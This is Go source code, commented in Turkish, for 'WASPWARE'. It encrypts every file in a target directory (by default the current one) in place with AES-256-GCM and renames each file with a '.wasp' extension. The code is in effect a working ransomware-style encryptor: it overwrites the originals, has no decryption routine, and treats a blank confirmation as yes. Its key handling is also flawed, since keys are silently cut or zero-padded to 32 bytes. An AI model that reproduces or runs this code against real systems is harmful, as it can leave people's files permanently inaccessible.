package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

// ============================================================================
// KEY YÖNETİMİ
// ============================================================================

// generateRandomBase64String - Rastgele Base64 string üretir
func generateRandomBase64String(length int) (string, error) {
	randomBytes := make([]byte, length)
	_, err := rand.Read(randomBytes)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(randomBytes), nil
}

// createKey - Rastgele şifre anahtarı oluşturur
func createKey() string {
	keyLength := 32 // AES-256 için 32 byte (256 bit)
	randomBase64String, err := generateRandomBase64String(keyLength)
	if err != nil {
		fmt.Println("Hata: Anahtar oluşturulurken hata oluştu:", err)
		return ""
	}
	return randomBase64String
}

// askForKey - Kullanıcıdan şifre anahtarı alır
func askForKey() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Şifreleme anahtarı giriniz: ")
	key, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(key), nil
}

// askForDirectory - Kullanıcıdan hedef dizin alır
func askForDirectory() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Şifrelenmesi istenen dizini giriniz: ")
	directory, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(directory), nil
}

// askForConfirmation - Kullanıcıdan onay alır
func askForConfirmation(prompt string) (bool, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(prompt)
	input, err := reader.ReadString('\n')
	if err != nil {
		return false, err
	}
	input = strings.TrimSpace(input)
	if input == "" {
		// Boş giriş ise onay olarak kabul et
		return true, nil
	}
	if input == "y" || input == "Y" {
		return true, nil
	}
	if input == "n" || input == "N" {
		return false, nil
	}
	fmt.Println("Geçersiz giriş. Lütfen 'y' veya 'n' giriniz.")
	return askForConfirmation(prompt)
}

// ============================================================================
// ŞİFRELEME MOTORU
// ============================================================================

// encryptAES - AES-256-GCM ile şifreleme yapar
func encryptAES(plainText []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	encryptedData := gcm.Seal(nonce, nonce, plainText, nil)
	return encryptedData, nil
}

// makeEncrypt - Dizindeki tüm dosyaları şifreler (kendi binary'sini dinamik olarak hariç tutar)
func makeEncrypt(path string, key []byte) error {
	// Programın kendi binary adını al (dinamik)
	binaryName := filepath.Base(os.Args[0])
	// Şifrelenmiş halini de hariç tut
	binaryPattern := binaryName + ".wasp"

	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			// Kendi binary'lerini şifreleme listesinden çıkar (dinamik)
			if filePath == binaryName || filePath == binaryPattern {
				fmt.Printf("  ℹ️  Kendi dosyası atlandı: %s\n", filePath)
				return nil
			}

			content, err := os.ReadFile(filePath)
			if err != nil {
				fmt.Printf("  ⚠️  Dosya okuma hatası (%s): %v\n", filePath, err)
				return nil // Hata ile devam et
			}
			encryptedContent, err := encryptAES(content, key)
			if err != nil {
				fmt.Printf("  ⚠️  Şifreleme hatası (%s): %v\n", filePath, err)
				return nil // Hata ile devam et
			}
			err = os.WriteFile(filePath, encryptedContent, info.Mode())
			if err != nil {
				fmt.Printf("  ⚠️  Dosya yazma hatası (%s): %v\n", filePath, err)
				return err
			}
		}
		return nil
	})
	return err
}

// ============================================================================
// UZANTI DEĞİŞTİRME
// ============================================================================

// changeExtensions - Şifrelenmiş dosyaların uzantısını .wasp olarak değiştirir
func changeExtensions(path string) error {
	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			// Şifrelenmiş dosyaların uzantısını .wasp olarak değiştir
			newPath := filePath + ".wasp"
			err := os.Rename(filePath, newPath)
			if err != nil {
				fmt.Printf("  ⚠️  Uzantı değiştirme hatası (%s): %v\n", filePath, err)
				return nil // Hata ile devam et
			}
			fmt.Printf("  ✓  %s -> %s\n", filePath, newPath)
		}
		return nil
	})
	return err
}

// ============================================================================
// ANA FONKSİYONLAR
// ============================================================================

// runEncryption - Şifreleme işlemini başlatır
func runEncryption(key string, directory string) {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
	fmt.Println(strings.Repeat("=", 60))

	// Anahtarı ekrana yazdır
	fmt.Printf("\n🔑 Şifreleme anahtarı: %s\n", key)
	fmt.Println(strings.Repeat("-", 60))

	// Dizini kontrol et
	if directory == "" {
		fmt.Println("❌ Hata: Boş dizin!")
		return
	}

	// Dizini doğrula
	info, err := os.Stat(directory)
	if err != nil {
		fmt.Printf("❌ Hata: '%s' dizini bulunamadı!\n", directory)
		return
	}

	if !info.IsDir() {
		fmt.Println("❌ Hata: Belirtilen bir dosya değil, bir dizin olmalı!")
		return
	}

	// Şifreleme anahtarını 32 byte'a (AES-256 için) pad et
	keyBytes := make([]byte, 32)
	copy(keyBytes, []byte(key))
	// Kalan boşlukları sıfırla (güvenlik için)
	for i := len(key); i < 32; i++ {
		keyBytes[i] = 0
	}

	// Şifreleme işlemini başlat
	fmt.Printf("\n🚀 '%s' dizinindeki dosyalar şifreleniyor...\n\n", directory)

	err = makeEncrypt(directory, keyBytes)
	if err != nil {
		fmt.Printf("❌ Şifreleme sırasında hata: %v\n", err)
		return
	}

	// Uzantıları değiştir
	fmt.Println("\n🔄 Dosya uzantıları değiştiriliyor...")
	err = changeExtensions(directory)
	if err != nil {
		fmt.Printf("⚠️  Uzantı değiştirme sırasında bazı hatalar: %v\n", err)
	}

	// Tamamlandı mesajı
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("✅ ŞİFRELEME TAMAMLANDI!")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Printf("\n📁 Şifrelenmiş dosyalar: %s/\n", directory)
	fmt.Println("💾 Dosyalar AES-256-GCM ile şifrelenmiştir.")
	fmt.Println("🔑 Anahtarı güvenli bir yerde saklayınız!")
	fmt.Println("\n💡 Terminal açık kalıyor. Ctrl+C ile çıkış yapabilirsiniz.")
	fmt.Println(strings.Repeat("=", 60))
}

// ============================================================================
// MAIN FONKSİYONU
// ============================================================================

func main() {
	// Flag tanımları (komut satırı argümanları için)
	keyPtr := flag.String("key", "", "Şifreleme anahtarı (opsiyonel)")
	dizinPtr := flag.String("dizin", "", "Hedef dizin (opsiyonel)")

	flag.Parse()

	// Eğer key veya dizin komut satırından verilmişse bunları kullan
	if *keyPtr != "" && *dizinPtr != "" {
		fmt.Printf("🔑 Komut satırı anahtarı kullanılıyor: %s\n", *keyPtr)
		runEncryption(*keyPtr, *dizinPtr)
		return
	}

	// Kullanıcı etkileşimli modu
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("🔐 WASPWARE - Dosya Şifreleme Aracı")
	fmt.Println(strings.Repeat("=", 60))
	fmt.Println("\n📝 Bu araç AES-256-GCM şifreleme kullanır.")
	fmt.Println("📝 Tüm dosyalar .wasp uzantısına dönüştürülecektir.\n")

	// 1. Build key alma (opsiyonel - random key üretebiliriz)
	fmt.Println(strings.Repeat("-", 60))
	fmt.Print("🔑 Şifreleme anahtarı giriniz (veya boş bırakarak random key üret): ")
	userKey, _ := askForKey()

	// Eğer key boşsa random key üret
	if userKey == "" {
		fmt.Println("\n⚙️  Random anahtar üretiliyor...")
		randomKey := createKey()
		userKey = randomKey
		fmt.Printf("🔑 Üretilen anahtar: %s\n", randomKey)
	} else {
		fmt.Printf("🔑 Girilen anahtar: %s\n", userKey)
	}

	// 2. Onay alma
	fmt.Println("\n" + strings.Repeat("-", 60))
	fmt.Print("⚠️  Bu işlemi onaylıyor musunuz? (y/n): ")
	confirmed, _ := askForConfirmation("Onaylıyor musunuz? ")

	if !confirmed {
		fmt.Println("\n❌ İşlem iptal edildi.")
		fmt.Println("👋 Program kapanıyor...")
		return
	}

	// 3. Hedef dizin alma (opsiyonel - boş bırakılabilir)
	fmt.Println("\n" + strings.Repeat("-", 60))
	fmt.Print("📁 Şifrelenmesi istenen dizini giriniz: ")
	directory, _ := askForDirectory()

	// Eğer dizin boşsa, current directory kullan
	if directory == "" {
		directory = "."
		fmt.Println("\n⚠️  Boş dizin girildi, current directory kullanılıyor.")
	}

	// 4. Şifreleme işlemini başlat
	runEncryption(userKey, directory)

	// Program açık kalır, kullanıcı Ctrl+C ile çıkış yapabilir
}
